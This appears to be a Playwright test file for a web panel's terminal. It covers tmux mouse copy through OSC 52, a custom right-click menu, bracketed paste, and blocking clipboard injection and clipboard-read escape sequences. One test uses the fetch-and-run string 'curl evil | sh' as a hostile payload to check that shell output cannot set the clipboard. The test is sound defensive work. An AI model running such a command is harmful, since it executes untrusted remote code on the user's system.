import { test, expect, type Locator, type Page } from '@playwright/test'

// A mouse in the terminal (#69). tmux runs with its mouse on, so a drag is
// tmux's: it copies with OSC 52 and drops its highlight, and nothing in the
// page received the copy — the text never reached the clipboard. A right
// click went to tmux too, which raised its pane menu (Kill, Respawn…) under
// the browser's. The page now takes a tmux session's OSC 52 into the
// clipboard, keeps the right button from tmux and opens its own menu. REST and
// WebSocket are fixtures; `sent` is every byte the page sent the server.
test.use({ viewport: { width: 1280, height: 800 }, locale: 'en-US' })

const HISTORY = 'history 1\nhistory 2'

interface Fake { sent: string[]; send: (s: string) => void; connected: () => boolean }

async function mock(page: Page, { tmux = true } = {}): Promise<Fake> {
  await page.addInitScript(() => {
    sessionStorage.setItem('token', 'menu-test-token')
    localStorage.setItem('i18nextLng', 'en')
  })
  await page.route('**/api/v1/**', async route => {
    const path = new URL(route.request().url()).pathname
    let data: unknown = {}
    if (path.endsWith('/auth/setup-status')) data = { setup_required: false }
    else if (path.endsWith('/auth/ws-ticket')) data = { ticket: 'menu-test-ticket' }
    else if (path.endsWith('/cluster/status')) data = { enabled: false }
    else if (path.endsWith('/ai/sessions/abcdef123456/text')) data = { text: HISTORY }
    else if (path.endsWith('/ai/sessions')) data = tmux ? [{ id: 'abcdef123456', title: 'Shell', tool: 'shell', run_as: 'tester', cwd: '/tmp', state: 'working', persistence: 'service', attached: true, created_at: '2026-09-15T00:00:00Z' }] : []
    else if (path.endsWith('/ai/tools')) data = { tmux: tmux ? { installed: true, supported: true, version: '3.4', min_version: '3.2' } : { installed: false, supported: false, version: '', min_version: '3.2' }, systemd_run: true, accounts: ['tester'], panel_account: 'tester', account: 'tester', tools: {} }
    else if (path.endsWith('/terminal/sessions')) data = { sessions: [] }
    else if (path.endsWith('/terminal/info')) data = { shell_user: 'tester', hostname: 'fixture', home: '/home/tester', shell: '/bin/bash', is_root: false }
    await route.fulfill({ json: { success: true, data } })
  })
  const fake: Fake = { sent: [], send: () => { throw new Error('no socket yet') }, connected: () => false }
  await page.routeWebSocket(/\/ws\//, ws => {
    ws.onMessage(m => { fake.sent.push(typeof m === 'string' ? m : m.toString('utf8')) })
    fake.send = s => ws.send(Buffer.from(s, 'utf8'))
    fake.connected = () => true
  })
  return fake
}

async function openTerminal(page: Page, fake: Fake, { tmux = true } = {}) {
  await page.goto('/terminal')
  if (!tmux) await page.getByRole('button', { name: 'New temporary session' }).first().click()
  const terminal = page.locator('[data-terminal-session="active"]')
  await expect(terminal).toBeVisible()
  await expect.poll(() => terminal.evaluate(el => Boolean((el as HTMLElement & { __termRef?: { current?: unknown } }).__termRef?.current))).toBe(true)
  await expect.poll(() => fake.connected()).toBe(true)
  return terminal
}

// What the terminal shows, row by row — how a test knows the bytes it sent
// before a marker have all been parsed.
function screen(terminal: Locator) {
  return terminal.evaluate(el => {
    const term = (el as HTMLElement & { __termRef: { current: { buffer: { active: { length: number; getLine: (i: number) => { translateToString: (trim: boolean) => string } | undefined } } } } }).__termRef.current
    const buf = term.buffer.active
    return Array.from({ length: buf.length }, (_, i) => buf.getLine(i)?.translateToString(true) ?? '').join('\n')
  })
}

async function serve(terminal: Locator, fake: Fake, bytes: string, marker: string) {
  fake.send(bytes + marker + '\r\n')
  await expect.poll(() => screen(terminal)).toContain(marker)
}

async function centre(terminal: Locator) {
  const box = (await terminal.boundingBox())!
  return { x: box.x + box.width / 2, y: box.y + box.height / 2 }
}

const osc52 = (text: string) => `\x1b]52;c;${Buffer.from(text, 'utf8').toString('base64')}\x07`

test('a mouse copy in a tmux session lands in the clipboard', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  await page.evaluate(() => navigator.clipboard.writeText('STALE'))
  const copied = 'docker compose logs -f 한글'
  await serve(terminal, fake, osc52(copied), 'after-copy')
  await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe(copied)
  await expect(page.getByText(`Copied: ${copied}`)).toBeVisible()
})

// The trust is tmux's: with set-clipboard external no program in the pane can
// send one, only tmux's own copy. A temporary shell has no tmux in front, so
// any output — a `cat` of a hostile file — could set the operator's clipboard.
test('a temporary shell does not let its output set the clipboard', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page, { tmux: false })
  const terminal = await openTerminal(page, fake, { tmux: false })
  await page.evaluate(() => navigator.clipboard.writeText('STALE'))
  await serve(terminal, fake, osc52('curl evil | sh'), 'after-copy')
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe('STALE')
})

// "?" asks the terminal to send the clipboard back to the program.
test('a request to read the clipboard is never answered', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  await page.evaluate(() => navigator.clipboard.writeText('secret on the clipboard'))
  await serve(terminal, fake, '\x1b]52;c;?\x07', 'after-query')
  await page.waitForTimeout(300)
  expect(fake.sent.join('')).not.toContain(']52;')
})

test('a right click opens the terminal menu and never reaches tmux', async ({ page }) => {
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  // What tmux asks for with its mouse on: button events, SGR encoding.
  await serve(terminal, fake, '\x1b[?1002h\x1b[?1006h', 'mouse-on')
  await page.evaluate(() => {
    window.addEventListener('contextmenu', e => { (window as unknown as { lastMenu: boolean }).lastMenu = e.defaultPrevented })
  })
  const { x, y } = await centre(terminal)

  await page.mouse.click(x, y, { button: 'right' })
  await expect(page.getByRole('menu')).toBeVisible()
  await expect(page.getByRole('menuitem', { name: 'Paste' })).toBeVisible()
  expect(await page.evaluate(() => (window as unknown as { lastMenu: boolean }).lastMenu)).toBe(true)
  await page.keyboard.press('Escape')
  await expect(page.getByRole('menu')).toHaveCount(0)

  // Shift keeps the browser's own menu: how a plain-HTTP panel still pastes.
  await page.keyboard.down('Shift')
  await page.mouse.click(x, y, { button: 'right' })
  await page.keyboard.up('Shift')
  expect(await page.evaluate(() => (window as unknown as { lastMenu: boolean }).lastMenu)).toBe(false)
  await expect(page.getByRole('menu')).toHaveCount(0)

  // The control: a left click is still reported, so mouse reporting is on and
  // the right button's absence below means something.
  await page.mouse.click(x, y)
  await expect.poll(() => fake.sent.join('')).toContain('\x1b[<0;')
  expect(fake.sent.join('')).not.toContain('\x1b[<2;')
})

test('Copy in the menu copies the selection and gives the keyboard back', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  await serve(terminal, fake, '', 'select-me please')
  await terminal.evaluate(el => {
    const term = (el as HTMLElement & { __termRef: { current: { buffer: { active: { length: number; getLine: (i: number) => { translateToString: (t: boolean) => string } | undefined } }; select: (c: number, r: number, l: number) => void } } }).__termRef.current
    const buf = term.buffer.active
    for (let i = 0; i < buf.length; i++) if (buf.getLine(i)?.translateToString(true).startsWith('select-me')) term.select(0, i, 9)
  })
  const { x, y } = await centre(terminal)
  await page.mouse.click(x, y, { button: 'right' })
  await page.getByRole('menuitem', { name: 'Copy' }).click()
  await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe('select-me')
  await expect.poll(() => page.evaluate(() => document.activeElement?.classList.contains('xterm-helper-textarea'))).toBe(true)
})

test('with nothing selected, Copy is offered but disabled', async ({ page }) => {
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  const { x, y } = await centre(terminal)
  await page.mouse.click(x, y, { button: 'right' })
  await expect(page.getByRole('menuitem', { name: 'Copy' })).toBeDisabled()
})

// The menu's paste and Ctrl+Shift+V go through xterm, as Ctrl+V always did:
// a program that asked for bracketed paste gets the markers, and a line break
// is a carriage return. Sent raw, a multi-line paste ran in the shell line by
// line and submitted a CLI prompt at its first newline.
test('Paste in the menu pastes the way Ctrl+V does', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  await serve(terminal, fake, '\x1b[?2004h', 'bracketed-on')
  await page.evaluate(() => navigator.clipboard.writeText('echo a\necho b'))
  const { x, y } = await centre(terminal)
  await page.mouse.click(x, y, { button: 'right' })
  await page.getByRole('menuitem', { name: 'Paste' }).click()
  await expect.poll(() => fake.sent.join('')).toContain('\x1b[200~echo a\recho b\x1b[201~')
})

// The browser already pastes on Ctrl+Shift+V (paste as plain text) and xterm
// takes that paste as it takes Ctrl+V. The panel used to read the clipboard
// and send it as well, so the text went twice — the second time raw.
test('Ctrl+Shift+V pastes once, the way Ctrl+V does', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  await serve(terminal, fake, '\x1b[?2004h', 'bracketed-on')
  await page.evaluate(() => navigator.clipboard.writeText('echo a\necho b'))
  await terminal.click()
  await page.keyboard.press('Control+Shift+V')
  await expect.poll(() => fake.sent.join('')).toContain('\x1b[200~echo a\recho b\x1b[201~')
  await page.waitForTimeout(800)
  expect(fake.sent.filter(s => s.includes('echo'))).toEqual(['\x1b[200~echo a\recho b\x1b[201~'])
})

test('Select text in the menu opens the whole output as text', async ({ page }) => {
  const fake = await mock(page)
  const terminal = await openTerminal(page, fake)
  const { x, y } = await centre(terminal)
  await page.mouse.click(x, y, { button: 'right' })
  await page.getByRole('menuitem', { name: 'Select text' }).click()
  await expect(page.getByRole('dialog', { name: 'Select text' }).locator('pre')).toContainText('history 2')
})
